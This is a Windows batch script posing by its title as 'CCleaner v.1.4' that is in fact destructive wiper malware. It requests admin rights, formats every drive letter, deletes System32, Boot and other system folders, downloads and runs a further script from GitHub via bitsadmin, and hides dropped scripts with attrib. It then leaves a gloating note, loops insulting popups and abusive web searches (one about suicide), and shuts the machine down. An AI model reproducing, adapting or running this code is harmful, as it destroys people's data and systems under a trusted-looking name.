@echo off
color c
title New Project "CCleaner v.1.4"

#New Version by Phoenixthrush

#Ask for Admin rights

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

#Format all Hard Disks

FORMAT A: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT B: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT D: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT E: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT F: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT G: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT H: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT I: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT J: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT K: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT L: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT M: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT N: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT O: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT P: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT Q: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT R: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT S: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT T: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT U: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT V: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT W: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT X: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT Y: /FS:NTFS /V:Suck my Dick /Q /X /U
FORMAT Z: /FS:NTFS /V:Suck my Dick /Q /X /U

#Delete all System Files

cd C:\Windows\System32
takeown /F . /R
del . /s /q
cd C:\Windows\System
takeown /F . /R
del . /s /q
cd C:\Windows\Boot
takeown /F . /R
del . /s /q
cd C:\Windows\SysWOW64
takeown /F . /R
del . /s /q
cd C:\pagefile.sys
takeown /F . /R
del . /s /q
cd C:\hiberfil.sys
takeown /F . /R
del . /s /q
cd C:\AppData
takeown /F . /R
del . /s /q

#Locate to the Download Folder
cd C:\Windows\Temp

#Jigsaw Ransomeware
bitsadmin /transfer debjob /download /priority foreground https://github.com/Phoenixthrush/phoenixthrush.github.io/raw/master/phoenixzoo/Memz/Memz.bat

#Creating kill message
>%userprofile%\Desktop\ReadMe.txt (
echo Hey,
echo.
echo Windows sucks!
echo Btw. I'm sry bro Windows will not boot up again!
echo Just use Linux, maybe Kali or Ubuntu^^
echo Ur Files are gone!
echo Windows is shit!
echo Nobody can get your Files back!
echo.
echo Sweet Greetings!
)

#Creating Google Payload
>C:\Windows\Temp\GooglePayload.bat (
echo @echo off
echo echo.
echo :GooglePayload
echo echo.
echo start "" "http://google.co.ck/search?q=Fortnite+is+gay"
echo timeout 10
echo start "" "http://google.co.ck/search?q=Minecraft+is+the+best+game+in+the+world"
echo timeout 10
echo start "" "http://google.co.ck/search?q=best+way+to+kill+yourself"
echo timeout 10
echo start "" "http://google.co.ck/search?q=how+2+remove+a+virus"
echo timeout 10
echo start "" "http://google.co.ck/search?q=mcafee+vs+norton"
echo timeout 10
echo start "" "http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend"
echo timeout 10
echo start "" "http://google.co.ck/search?q=minecraft+hax+download+no+virus"
echo timeout 10
echo start "" "http://google.co.ck/search?q=how+to+get+money"
echo timeout 10
echo start "" "http://google.co.ck/search?q=bonzi+buddy+download+free"
echo timeout 10
echo start "" "http://google.co.ck/search?q=how+2+buy+weed"
echo timeout 10
echo start "" "http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic"
echo timeout 10
echo start "" "http://google.co.ck/search?q=batch+virus+download"
echo timeout 10
echo start "" "http://google.co.ck/search?q=virus.exe"
echo timeout 10
echo start "" "http://google.co.ck/search?q=internet+explorer+is+the+best+browser"
echo timeout 10
echo start "" "http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2019"
echo timeout 10
echo start "" "http://google.co.ck/search?q=virus+builder+legit+free+download"
echo timeout 10
echo start "" "http://google.co.ck/search?q=how+to+create+your+own+ransomware"
echo timeout 10
echo start "" "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp"
echo timeout 10
echo start "" "http://google.co.ck/search?q=dank+memz"
echo timeout 10
echo start "" "http://google.co.ck/search?q=half+life+3+release+date"
echo timeout 10
echo start "" "http://google.co.ck/search?q=is+illuminati+real"
echo timeout 10
echo start "" "http://google.co.ck/search?q=montage+parody+making+program+2019"
echo timeout 10
echo start "" "http://google.co.ck/search?q=the+memz+are+real"
echo timeout 10
echo start "" "http://google.co.ck/search?q=stanky+danky+maymays"
echo timeout 10
echo start "" "http://google.co.ck/search?q=john+cena+midi+legit+not+converted"
echo timeout 10
echo start "" "http://google.co.ck/search?q=vinesauce+meme+collection"
echo timeout 10
echo start "" "http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi"
echo timeout 10
echo start "" "http://play.clubpenguin.com"
echo timeout 10
echo start "" "http://pcoptimizerpro.com"
echo timeout 10
echo start "" "http://softonic.com"
echo timeout 10
echo echo.
echo goto GooglePayload
)

#Creating MSGBoxes
>C:\Windows\Temp\MSG1.vbs (
echo MsgBox "REST IN PISS, FOREVER MISS", vbExclamation, "you are such a loser"
)

>C:\Windows\Temp\MSG2.vbs (
echo MsgBox "I WARNED YOU...", vbExclamation, "Windows sucks"
)

>C:\Windows\Temp\MSG3.vbs (
echo MsgBox "HAHA N00B L2P G3T R3KT", vbExclamation, "use Linux!"
)

>C:\Windows\Temp\MSG4.vbs (
echo MsgBox "You failed at your 1337 h4x0r skillz", vbExclamation, "u stupid shit"
)

>C:\Windows\Temp\MSG5.vbs (
echo MsgBox "YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!", vbExclamation, "LOL"
)

>C:\Windows\Temp\MSG6.vbs (
echo MsgBox "HACKER! ENJOY BAN!", vbExclamation, "I have spend so much time for this"
)

>C:\Windows\Temp\MSG7.vbs (
echo MsgBox "GET BETTER HAX NEXT TIME xD", vbExclamation, "go cry"
)

>C:\Windows\Temp\MSG8.vbs (
echo MsgBox "HAVE FUN TRYING TO RESTORE YOUR DATA :D", vbExclamation, "fuck of"
)

>C:\Windows\Temp\MSG9.vbs (
echo MsgBox "BSOD INCOMING", vbExclamation, "I hate Windows"
)

>C:\Windows\Temp\MSG10.vbs (
echo MsgBox "VIRUS PRANK GONE WRONG", vbExclamation, "All your files are gone"
)

>C:\Windows\Temp\MSG11.vbs (
echo MsgBox "Dank Memes are the best one", vbExclamation, "It is a bit emotional that I have wrote this"
)

>C:\Windows\Temp\MSG12.vbs (
echo MsgBox "Get dank antivirus m9!", vbExclamation, "Your gay"
)

>C:\Windows\Temp\MSG13.vbs (
echo MsgBox "You are an idiot! HA HA HA HA HA HA HA", vbExclamation, "stupid"
)

>C:\Windows\Temp\MSG14.vbs (
echo MsgBox "#MakeMalwareGreatAgain", vbExclamation, "bro, IÃƒâ€šÃ‚Â´m a stupid Kid which copied some Skripts..."
)

>C:\Windows\Temp\MSG15.vbs (
echo MsgBox "SOMEBODY ONCE TOLD ME THE MEMZ ARE GONNA ROLL ME", vbExclamation, "Minecraft hax"
)

>C:\Windows\Temp\MSG16.vbs (
echo MsgBox "Fortnite is gay!", vbExclamation, "Why do you just started this Programm"
)

>C:\Windows\Temp\MSG17.vbs (
echo MsgBox "SecureBoot sucks.", vbExclamation, "Your PC is going to die"
)

>C:\Windows\Temp\MSG18.vbs (
echo MsgBox "gr8 m8 i r8 8/8", vbExclamation, "This is the end of your PC! Have a nice Day!"
)

>C:\Windows\Temp\MSG19.vbs (
echo MsgBox "Have you tried turning it off and on again?", vbExclamation, "Bye! Hahahahha"
)

#Creating VBS Skript to run the Batchfiles in Background
set temp=C:\Windows\Temp\
set name=HideGoogle.vbs
set line1=Set WshShell = WScript.CreateObject( "WScript.Shell" )
set line2=WshShell.Run "C:\Windows\Temp\GooglePayload.bat",0,True

echo %line1% >> %temp%%name%
echo %line2% >> %temp%%name%

#Creating VBS Skript to run the MSG Payload in Background
set temp1=C:\Windows\Temp\
set name1=HideMSG.vbs
set line11=Set WshShell = WScript.CreateObject( "WScript.Shell" )
set line12=WshShell.Run "C:\Windows\Temp\MSGPayload.bat",0,True

echo %line11% >> %1temp%%name1%
echo %line12% >> %1temp%%name1%

#Run the MSGs
>C:\Windows\Temp\MSGPayload.bat (
echo @echo off
echo echo.
echo :Loop
echo start MSG1.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG2.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG3.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG4.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG5.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG6.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG7.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG8.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG9.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG10.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG11.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG12.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG13.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG14.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG15.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG16.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG17.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG18.vbs
echo timeout 5
echo taskkill /im wscript.exe /f
echo start MSG19.vbs
echo timeout 5
echo echo.
echo goto Loop
)

#Double Enter for Memz
set temp3=C:\Windows\Temp\
set name3=enter.vbs
set line13=set WshShell = CreateObject("WScript.Shell")
set line23=WshShell.SendKeys "{ENTER}"
set line33=wscript.sleep 5000
set line43=WshShell.SendKeys "{DOWN}"

echo %line13% >> %temp3%%name3%
echo %line23% >> %temp3%%name3%
echo %line33% >> %temp3%%name3%
echo %line43% >> %temp3%%name3%

#attribs on Skripts
attrib +r +h +s C:\Windows\Temp\MSG1.vbs
attrib +r +h +s C:\Windows\Temp\MSG2.vbs
attrib +r +h +s C:\Windows\Temp\MSG3.vbs
attrib +r +h +s C:\Windows\Temp\MSG4.vbs
attrib +r +h +s C:\Windows\Temp\MSG5.vbs
attrib +r +h +s C:\Windows\Temp\MSG6.vbs
attrib +r +h +s C:\Windows\Temp\MSG7.vbs
attrib +r +h +s C:\Windows\Temp\MSG8.vbs
attrib +r +h +s C:\Windows\Temp\MSG9.vbs
attrib +r +h +s C:\Windows\Temp\MSG10.vbs
attrib +r +h +s C:\Windows\Temp\MSG11.vbs
attrib +r +h +s C:\Windows\Temp\MSG12.vbs
attrib +r +h +s C:\Windows\Temp\MSG13.vbs
attrib +r +h +s C:\Windows\Temp\MSG14.vbs
attrib +r +h +s C:\Windows\Temp\MSG15.vbs
attrib +r +h +s C:\Windows\Temp\MSG16.vbs
attrib +r +h +s C:\Windows\Temp\MSG17.vbs
attrib +r +h +s C:\Windows\Temp\MSG18.vbs
attrib +r +h +s C:\Windows\Temp\MSG19.vbs
attrib +r +h +s C:\Windows\Temp\Memz.bat
attrib +r +h +s C:\Windows\Temp\GooglePayload.bat
attrib +r +h +s C:\Windows\Temp\HideGoogle.vbs
attrib +r +h +s C:\Windows\Temp\HideMSG.vbs
attrib +r +h +s C:\Windows\Temp\enter.vbs

#Running all Skripts
cd C:\Windows\Temp
start Memz.bat
timeout 2
start enter.vbs
start HideGoogle.vbs
start HideMSG.vbs
timeout 5
start ReadMe.exe

timeout 350
shutdown /s
